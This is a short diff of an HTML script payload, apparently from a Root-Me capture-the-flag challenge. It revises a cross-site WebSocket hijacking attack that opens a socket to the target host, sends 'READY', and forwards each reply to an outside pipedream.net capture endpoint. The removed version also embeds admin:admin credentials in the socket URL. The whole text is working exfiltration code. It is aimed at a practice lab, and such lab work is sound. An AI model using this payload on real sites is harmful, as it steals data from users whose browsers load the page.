@@ -1,13 +1,16 @@
 <script>
-  fetch('https://eocvkn4m3kpce3q.m.pipedream.net');
-  var websocket = new WebSocket('ws://admin:admin@ctf19.root-me.org/ws');
-  websocket.onopen = start
-websocket.onmessage = handleReply
-function start(event) {
-  websocket.send("READY");
-}
-function handleReply(event) {
-  fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors'})
-}
+  let w = open("http://ctf19.root-me.org");
+  setTimeout(() => {
+    var websocket = new WebSocket('ws://ctf19.root-me.org/ws');
+    websocket.onopen = start;
+  websocket.onmessage = handleReply;
+  function start(event) {
+    websocket.send("READY");
+  }
+  function handleReply(event) {
+    fetch('https://eocvkn4m3kpce3q.m.pipedream.net?'+event.data, {mode: 'no-cors'})
+  }
+
+}, 1000)
 
 </script>
